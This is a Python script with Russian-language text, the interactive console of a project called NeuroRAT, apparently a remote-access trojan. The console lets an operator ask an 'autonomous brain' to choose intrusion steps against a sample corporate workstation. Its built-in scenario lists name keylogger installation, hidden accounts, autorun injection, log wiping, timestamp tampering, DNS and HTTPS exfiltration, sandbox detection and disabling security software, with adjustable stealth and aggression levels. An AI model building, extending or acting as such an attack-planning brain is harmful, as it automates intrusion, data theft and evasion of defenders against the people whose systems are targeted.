#!/usr/bin/env python3
"""
Интерактивный режим для общения с автономным мозгом NeuroRAT
"""

import os
import sys
import json
import logging
import argparse
import time
from typing import List, Dict, Any

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("neurorat-interactive")

# Import the AutonomousBrain
try:
    from autonomous_brain import AutonomousBrain
    HAS_BRAIN = True
except ImportError:
    HAS_BRAIN = False
    logger.error("Не могу импортировать AutonomousBrain - убедитесь, что вы в правильной директории")
    sys.exit(1)

def interactive_session():
    """Запускает интерактивный сеанс с автономным мозгом"""
    print("\n🧠 NeuroRAT - Интерактивный режим автономного мозга 🧠")
    print("=================================================")
    
    # Инициализируем мозг
    brain = AutonomousBrain(
        system_profile="balanced",
        max_memory_mb=512,
        use_api=True,
        verbose=True
    )
    
    # Базовая информация о системе
    system_info = {
        "os": "Windows 10 Enterprise",
        "hostname": "CORP-WORKSTATION",
        "username": "john.smith",
        "ip": "192.168.1.105",
        "domain": "example.corp"
    }
    
    # Сценарии действий для различных ситуаций
    action_scenarios = {
        "информация": [
            "Собрать информацию о системе",
            "Найти документы с паролями",
            "Просканировать сетевые соединения",
            "Проверить запущенные процессы",
            "Проанализировать файлы пользователя"
        ],
        "атака": [
            "Установить кейлоггер",
            "Создать скрытую учетную запись",
            "Внедрить вредоносный код в автозагрузку",
            "Эксплуатировать уязвимость в браузере",
            "Выполнить повышение привилегий"
        ],
        "скрытность": [
            "Маскировать процессы",
            "Удалить следы в журналах",
            "Изменить временные метки файлов",
            "Шифровать сетевой трафик",
            "Установить скрытый туннель"
        ],
        "эксфильтрация": [
            "Сжать и зашифровать данные",
            "Отправить данные через DNS-запросы",
            "Выгрузить данные через HTTPS",
            "Разбить данные на мелкие части",
            "Использовать стеганографию"
        ],
        "защита": [
            "Обнаружить антивирус",
            "Проверить наличие песочницы",
            "Обход файервола",
            "Отключить защитное ПО",
            "Создать ложные следы"
        ]
    }
    
    print("\n⚙️ Информация о системе:")
    for key, value in system_info.items():
        print(f"  {key}: {value}")
    
    print("\n⚙️ Состояние мозга:")
    print(f"  Профиль: {brain.system_profile}")
    print(f"  Уровень скрытности: {brain.current_state['stealth_level']:.2f}")
    print(f"  Уровень агрессии: {brain.current_state['aggression_level']:.2f}")
    
    # Основной цикл взаимодействия
    while True:
        print("\n" + "=" * 50)
        print("Выберите действие:")
        print("1. Задать ситуацию вручную")
        print("2. Выбрать сценарий")
        print("3. Настроить уровни скрытности/агрессии")
        print("4. Показать историю действий")
        print("5. Выход")
        
        choice = input("\nВаш выбор: ")
        
        if choice == "1":
            # Ручной ввод ситуации
            situation = input("\nОпишите ситуацию: ")
            
            print("\nВведите доступные действия (пустая строка для завершения):")
            options = []
            while True:
                option = input(f"Действие {len(options)+1}: ")
                if not option:
                    break
                options.append(option)
            
            if not options:
                print("Действия не указаны, использую стандартные...")
                options = [
                    "Собрать информацию о системе",
                    "Установить кейлоггер",
                    "Создать скрытую учетную запись",
                    "Ничего не делать и продолжить наблюдение"
                ]
            
            urgency = float(input("\nУкажите уровень срочности (0.0-1.0): ") or "0.5")
            
            # Позволим мозгу принять решение
            decision = brain.decide_action(
                situation=situation,
                options=options,
                system_info=system_info,
                urgency=urgency
            )
            
            print("\n🧠 Решение мозга:")
            print(f"Выбранное действие: {decision['action']}")
            print(f"Обоснование: {decision['reasoning']}")
            print(f"Следующие шаги: {decision.get('next_steps', 'Н/Д')}")
            print(f"Метод: {decision.get('method', 'Н/Д')}")
            print(f"Уверенность: {decision.get('confidence', 0.0):.2f}")
            
        elif choice == "2":
            # Выбор сценария
            print("\nДоступные сценарии:")
            for i, scenario in enumerate(action_scenarios.keys()):
                print(f"{i+1}. {scenario}")
            
            scenario_choice = int(input("\nВыберите сценарий: ") or "1") - 1
            scenario_names = list(action_scenarios.keys())
            
            if 0 <= scenario_choice < len(scenario_names):
                selected_scenario = scenario_names[scenario_choice]
                options = action_scenarios[selected_scenario]
                
                situation = input("\nОпишите ситуацию (или нажмите Enter для стандартной): ")
                if not situation:
                    situation = f"Требуется выполнить задачу типа '{selected_scenario}' на целевой системе."
                
                urgency = float(input("\nУкажите уровень срочности (0.0-1.0): ") or "0.5")
                
                # Позволим мозгу принять решение
                decision = brain.decide_action(
                    situation=situation,
                    options=options,
                    system_info=system_info,
                    urgency=urgency
                )
                
                print("\n🧠 Решение мозга:")
                print(f"Выбранное действие: {decision['action']}")
                print(f"Обоснование: {decision['reasoning']}")
                print(f"Следующие шаги: {decision.get('next_steps', 'Н/Д')}")
                print(f"Метод: {decision.get('method', 'Н/Д')}")
                print(f"Уверенность: {decision.get('confidence', 0.0):.2f}")
            else:
                print("Неверный выбор сценария.")
            
        elif choice == "3":
            # Настройка уровней
            stealth = float(input(f"Новый уровень скрытности (0.0-1.0) [{brain.current_state['stealth_level']:.2f}]: ") or str(brain.current_state['stealth_level']))
            aggression = float(input(f"Новый уровень агрессии (0.0-1.0) [{brain.current_state['aggression_level']:.2f}]: ") or str(brain.current_state['aggression_level']))
            
            brain.current_state['stealth_level'] = max(0.0, min(1.0, float(stealth)))
            brain.current_state['aggression_level'] = max(0.0, min(1.0, float(aggression)))
            
            print(f"\nУровни обновлены:")
            print(f"  Уровень скрытности: {brain.current_state['stealth_level']:.2f}")
            print(f"  Уровень агрессии: {brain.current_state['aggression_level']:.2f}")
            
        elif choice == "4":
            # Показать историю действий
            history = brain.current_state['action_history']
            
            if not history:
                print("\nИстория действий пуста.")
            else:
                print("\n📜 История действий:")
                for i, action in enumerate(history):
                    action_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(action.get('time', 0)))
                    print(f"{i+1}. [{action_time}] {action.get('action', 'Неизвестное действие')}")
                    print(f"   Ситуация: {action.get('situation', 'Н/Д')}")
                    print(f"   Обоснование: {action.get('reasoning', 'Н/Д')}")
                    print()
            
        elif choice == "5":
            # Выход
            print("\nЗавершение работы NeuroRAT Interactive. До свидания!")
            break
            
        else:
            print("Неверный выбор. Пожалуйста, выберите 1-5.")

def main():
    """Основная функция"""
    parser = argparse.ArgumentParser(description="Интерактивный режим NeuroRAT Brain")
    args = parser.parse_args()
    
    interactive_session()

if __name__ == "__main__":
    main() 